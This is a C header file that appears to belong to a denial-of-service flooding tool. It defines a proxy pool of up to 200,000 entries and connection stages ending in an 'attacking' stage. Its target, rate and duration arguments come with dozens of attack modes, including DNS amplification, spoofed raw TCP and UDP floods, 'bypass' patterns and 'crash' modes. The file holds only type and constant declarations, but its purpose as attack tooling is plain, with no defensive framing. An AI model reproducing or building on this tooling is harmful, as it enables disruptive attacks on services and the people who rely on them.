#ifndef TYPES_H
#define TYPES_H

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <zlib.h>
#include <sys/resource.h>
#include <sched.h>
#include <ctype.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

static __thread unsigned int xorshift_state;

static inline void xorshift_init(unsigned int seed) {
    xorshift_state = seed ? seed : 1;
}

static inline unsigned int xorshift32(void) {
    unsigned int x = xorshift_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    xorshift_state = x;
    return x;
}

#define fast_rand() xorshift32()

#define MAX_PROXIES 200000
#define MAX_THREADS 256
#define EPOLL_SIZE 20000 
#define BUFFER_POOL_SIZE (1024 * 1024 * 32)
#define PULSE_INTERVAL_MS 50 
#define MAX_HTTP2_STREAMS 1000
#define MAX_CONNS_PER_PROXY 2048

#define STAGE_CONNECTING 0
#define STAGE_SOCKS_GREET 1
#define STAGE_SOCKS_AUTH 2
#define STAGE_SOCKS_CONN 3
#define STAGE_TLS_HANDSHAKE 4
#define STAGE_H2_PREFACE 5
#define STAGE_ATTACKING 6

#define PAYLOAD_CACHE_COUNT 64
#define STABLE_PAYLOAD_SIZE 524288

typedef struct {
    char host[128];
    int port;
    char user[64];
    char pass[64];
    int has_auth;
    int fail_count;
    int success_count;
    int is_dead;
    long long last_fail_time;
    volatile int active_conns;
} Proxy;

typedef struct {
    char host[256];
    char target_ip[64];
    int port;
    int rate;
    int duration;
    int threads;
    char mode[32];
    int is_tornado;
    int is_half_open;
    int is_v3_killer; 
    int is_crash_mode; 
    int is_v4_nightmare; 
    int is_v5_rapid; 
    int is_v6_void; 
    int is_v7_pipe; 
    int is_v8_phantom; 
    int is_v9_hydra; 
    int is_v10_persist; 
    int is_v11_chaos; 
    int is_v12_eclipse; 
    int is_v13_shadow; 
    int is_v14_phantom; 
    int is_v15_raw_amp;
    int is_v16_dns_amp;
    int is_v17_tcp_bypass;
    int is_v18_quic;
    int is_v18_tls;
    int is_v18_tcp;
    int is_stealth;
    int is_v20_ws;
    int is_v19_tcp;
    int is_raw_tcp;
    int is_raw_udp;
    int is_raw_tcp_spoof;
    int is_raw_udp_spoof;
    int is_hybrid_v15;
    int is_xdp_filter;
    char xdp_interface[32];
    int is_dry_run;
} Arguments;

typedef struct Connection {
    int fd;
    int thread_id;
    Proxy *proxy;
    int stage;
    int sub_stage;
    long long last_pulse_ms;
    unsigned char buffer[1500];
    SSL *ssl;
    int h2_stream_id;
    int h2_initialized;
    int keepalive_interval_ms; 
    int payload_idx;         
    long long last_window_vibration_ms; 
    int target_port;
    int jitter_ms;
    int writable;
    char randomized_ua[256];
    char randomized_headers[1024];
    int is_udp_assoc;
    struct sockaddr_in udp_relay_addr;
    int client_udp_fd;
    struct Connection *next;
    struct Connection *prev;
} Connection;

typedef struct {
    unsigned long long packets;
    unsigned long long bytes;
    unsigned long long connect_success;
    unsigned long long connect_fail;
    unsigned long long tcp_packets;
    unsigned long long raw_sent;
    unsigned long long send_errors;
} ThreadStats;

typedef struct {
    unsigned char pattern[64];
    int length;
} BypassPattern;


extern Arguments args;
extern Proxy *proxies;
extern int proxy_count;
extern volatile int global_active_conns;
extern volatile int global_proxy_active_conns;
extern unsigned char *global_buffer_pool;
extern ThreadStats thread_stats[MAX_THREADS];
extern pthread_t thread_ids[MAX_THREADS];
extern int open_ports[64];
extern int num_open_ports;
extern SSL_CTX *ssl_ctx;
extern unsigned char *payload_pool[PAYLOAD_CACHE_COUNT];
extern BypassPattern bypass_patterns[];
extern int bypass_patterns_count;

#endif
